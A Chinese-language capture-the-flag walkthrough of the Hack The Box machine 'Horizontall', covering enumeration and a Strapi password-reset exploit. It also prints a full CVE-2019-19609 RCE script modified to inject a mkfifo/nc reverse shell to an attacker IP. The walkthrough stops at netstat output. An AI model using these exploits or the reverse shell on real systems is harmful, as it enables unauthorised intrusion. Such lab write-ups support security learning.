# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测

```
┌──(root💀kali)-[~]
└─# nmap -sV -Pn 10.10.11.105                         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-02 08:48 EST
Nmap scan report for 10.10.11.105
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

手机访问80端口，跳转到了一个叫```horizontall.htb```的域名

我们先把这个域名添加到```/etc/hosts```

> echo "10.10.11.105 horizontall.htb" >> /etc/hosts

## 爆破目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://horizontall.htb/                                                                               

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/horizontall.htb/-_21-12-02_09-01-00.txt

Error Log: /root/dirsearch/logs/errors-21-12-02_09-01-00.log

Target: http://horizontall.htb/

[09:01:01] Starting: 
[09:01:10] 301 -  194B  - /js  ->  http://horizontall.htb/js/              
[09:01:11] 400 -  182B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[09:01:56] 400 -  182B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[09:02:01] 301 -  194B  - /css  ->  http://horizontall.htb/css/             
[09:02:06] 200 -    4KB - /favicon.ico                                      
[09:02:11] 301 -  194B  - /img  ->  http://horizontall.htb/img/             
[09:02:15] 403 -  580B  - /js/                                              
[09:02:17] 200 -  901B  - /index.html    
```

只有几个文件夹，没啥有用的发现

尝试爆破vhost，我们使用gobuster 

先把[这个字典](https://github.com/danielmiessler/SecLists)下载到本地

gobuster vhost -u horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 

```
┌──(root💀kali)-[~/htb/Horizontall]
└─# gobuster vhost -u horizontall.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://horizontall.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/12/02 23:28:43 Starting gobuster in VHOST enumeration mode
===============================================================
Found: api-prod.horizontall.htb (Status: 200) [Size: 413]
                                                         
===============================================================
2021/12/02 23:35:06 Finished
===============================================================

```

找到一个可以利用的二级域名：```api-prod.horizontall.htb```

编辑```/etc/hosts```

把```10.10.11.105 horizontall.htb```替换成```10.10.11.105 api-prod.horizontall.htb```


## 爆破二级域名
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://api-prod.horizontall.htb/ 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/api-prod.horizontall.htb/-_21-12-03_00-35-14.txt

Error Log: /root/dirsearch/logs/errors-21-12-03_00-35-14.log

Target: http://api-prod.horizontall.htb/

[00:35:15] Starting: 
[00:35:24] 400 -  182B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[00:35:35] 200 -  854B  - /ADMIN                                            
[00:35:35] 200 -  854B  - /Admin/login/                                     
[00:35:35] 200 -  854B  - /Admin                                            
[00:35:40] 400 -   67B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[00:35:45] 200 -  854B  - /admin                                            
[00:35:47] 200 -  854B  - /admin/_logs/access_log                           
[00:35:47] 200 -  854B  - /admin/.config                                    
[00:35:47] 200 -  854B  - /admin/.htaccess                                  
[00:35:47] 200 -  854B  - /admin/?/login
[00:35:47] 200 -  854B  - /admin/                                           
[00:35:47] 200 -  854B  - /admin/_logs/error-log
[00:35:47] 200 -  854B  - /admin/access_log                                 
[00:35:47] 200 -  854B  - /admin/admin-login                                
[00:35:47] 200 -  854B  - /admin/_logs/access-log
[00:35:47] 200 -  854B  - /admin/admin                                      
[00:35:47] 200 -  854B  - /admin/_logs/error_log
[00:35:47] 200 -  854B  - /admin/admin/login                                
[00:35:47] 200 -  854B  - /admin/adminLogin                                 
[00:35:47] 200 -  854B  - /admin/backup/                                    
[00:35:48] 200 -  854B  - /admin/backups/                                   
[00:35:48] 200 -  854B  - /admin/controlpanel                               
[00:35:48] 200 -  854B  - /admin/db/                                        
[00:35:48] 200 -  854B  - /admin/error_log
[00:35:48] 200 -  854B  - /admin/default
[00:35:48] 200 -  854B  - /admin/FCKeditor                                  
[00:35:48] 200 -  854B  - /admin/home                                       
[00:35:48] 200 -  854B  - /admin/index                                      
[00:35:48] 200 -  854B  - /admin/index.html                                 
[00:35:48] 200 -  854B  - /admin/js/tiny_mce                                
[00:35:48] 200 -  854B  - /admin/login                                      
[00:35:48] 200 -  854B  - /admin/js/tiny_mce/
[00:35:48] 200 -  854B  - /admin/js/tinymce/                                
[00:35:48] 200 -  854B  - /admin/js/tinymce                                 
[00:35:48] 200 -  854B  - /admin/cp                                         
[00:35:48] 200 -  854B  - /admin/account                                    
[00:35:48] 200 -  854B  - /admin/dumper/                                    
[00:35:48] 200 -  854B  - /admin/log                                        
[00:35:48] 200 -  854B  - /admin/logs/                                      
[00:35:48] 200 -  854B  - /admin/logs/error_log                             
[00:35:48] 200 -  854B  - /admin/logs/access_log                            
[00:35:48] 200 -  854B  - /admin/mysql/                                     
[00:35:48] 200 -  854B  - /admin/logs/access-log                            
[00:35:48] 200 -  854B  - /admin/phpMyAdmin                                 
[00:35:48] 200 -  854B  - /admin/logs/error-log
[00:35:48] 200 -  854B  - /admin/admin_login                                
[00:35:48] 200 -  854B  - /admin/phpMyAdmin/                                
[00:35:48] 200 -  854B  - /admin/manage                                     
[00:35:48] 200 -  854B  - /admin/pMA/
[00:35:48] 200 -  854B  - /admin/pma/                                       
[00:35:48] 200 -  854B  - /admin/portalcollect.php?f=http://xxx&t=js
[00:35:48] 200 -  854B  - /admin/phpmyadmin/
[00:35:48] 200 -  854B  - /admin/scripts/fckeditor
[00:35:48] 200 -  854B  - /admin/release
[00:35:48] 200 -  854B  - /admin/sysadmin/                                  
[00:35:48] 200 -  854B  - /admin/private/logs
[00:35:48] 200 -  854B  - /admin/sqladmin/                                  
[00:35:48] 200 -  854B  - /admin/sxd/
[00:35:48] 200 -  854B  - /admin/signin                                     
[00:35:48] 200 -  854B  - /admin/tinymce
[00:35:48] 200 -  854B  - /admin/tiny_mce                                   
[00:35:49] 200 -  854B  - /admin/web/                                       
[00:36:20] 400 -  182B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[00:36:38] 200 -    1KB - /favicon.ico                                      
[00:36:46] 200 -  413B  - /index.html                                       
[00:37:17] 200 -  507B  - /reviews                                          
[00:37:17] 200 -  121B  - /robots.txt     
```

有一个admin的后台
查看网页源代码，发现这个后台是由一个叫```Strapi```的cms做的

我们在谷歌搜索这个cms的漏洞利用脚本，选择[这个exp](https://www.exploit-db.com/exploits/50239)

下载到本地以后执行攻击
```
┌──(root💀kali)-[~/htb/Horizontall]
└─# python3 exp.py http://api-prod.horizontall.htb/                                                                        
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc
```
此时我们有了一个cms的登录凭证：```admin:SuperStrongPassword1```

同时记住这个token：```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc```


登录进入后台以后，我们在仪表盘发现cms的版本号是：```Strapi v3.0.0-beta.17.4```

根据这个版本号。在谷歌上搜索可以利用的exp，我们找到[这个攻击脚本](https://www.exploit-db.com/exploits/50238)

下载到本地

执行下面payload


> python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc" "id" "10.10.14.15" 


```
┌──(root💀kali)-[~/htb/Horizontall]
└─# python3 exp2.py "http://api-prod.horizontall.htb" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjM4NTk0MzkyLCJleHAiOjE2NDExODYzOTJ9.ixIRhKXcMV26i5Z8N3GuDASApeq3r6CSPfZQDlZGFjc" "id" "10.10.14.15"

=====================================
CVE-2019-19609 - Strapi RCE
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
=====================================

[+] Successful operation!!!
listening on [any] 9999 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.105] 45258
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}

```

第三个参数可以执行一条命令，由上可见当前webshell用户是```strapi```


但是这个shell每次只能执行一条命令，不好用。

现在我们知道exp是可以执行系统命令的，现在我们直接修改exp为一个反弹shell
```
# Exploit Title: Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)
# Date: 29/08/2021
# Exploit Author: David Utón (M3n0sD0n4ld)
# Vendor Homepage: https://strapi.io/
# Affected Version: strapi-3.0.0-beta.17.7 and earlier
# Tested on: Linux Ubuntu 18.04.5 LTS
# CVE : CVE-2019-19609

#!/usr/bin/python3
# Author: @David_Uton (m3n0sd0n4ld)
# Github: https://m3n0sd0n4ld.github.io
# Usage: python3 CVE-2019-19609.py http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST

import requests, sys, os, socket

logoType = ('''
=====================================
CVE-2019-19609 - Strapi RCE
-------------------------------------
@David_Uton (M3n0sD0n4ld)
https://m3n0sd0n4ld.github.io/
=====================================
		''')

if __name__ == '__main__':

	# Parameter checking
	if len(sys.argv) != 5:
		print(logoType)
		print("[!] Some of these parameters are missing.")
		print('''
		Use: python3 %s http[s]//IP[:PORT] TOKEN_JWT COMMAND LHOST
		Example: python3 10.10.10.10 eyJHbGCi..... "id" 127.0.0.1''' % sys.argv[0])
	# Exploit run
	else:
		# Paremeters
		url = sys.argv[1]
		token = sys.argv[2]
		command = sys.argv[3]
		lhost = sys.argv[4]
		lport = 9999
		
		s = requests.session()
		
		r = s.post(url, verify=False) # SSL == verify=True
		
		headersData = {
			'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
			'Authorization': "Bearer %s" % token
		}

		postData = {
			"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4242 >/tmp/f)" 
		}
		
		print(logoType)
		os.system("nc -nvlp 9999 &")
		try:
			print("[+] Successful operation!!!")
			r = s.post(url + "/admin/plugins/install", headers=headersData, data=postData, verify=False) # SSL == verify=True
			# Content print
			print(r.text)
		except:
			print("[!] An error occurred, try again.")
			sys.exit(1)

```

把postData里面的值从
> "plugin":"documentation && $(%s > /tmp/.m3 && nc %s %s < /tmp/.m3 | rm /tmp/.m3)" % (command, lhost, lport)

改成：
> "plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4242 >/tmp/f)" 

保存。

开启监听，执行攻击。

收到反弹的完整shell
```
─# nc -lnvp 4242               
listening on [any] 4242 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.105] 58760
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
$ whoami
strapi

```

查看所有tcp连接
```
netstat -nap|grep tcp
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8088            0.0.0.0:*               LISTEN      30505/python3       
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1856/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.10.11.105:59330      10.10.14.15:4242        CLOSE_WAIT  30456/nc            
tcp        0     23 10.10.11.105:59348      10.10.14.15:4242        ESTABLISHED 33027/nc            
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -     
```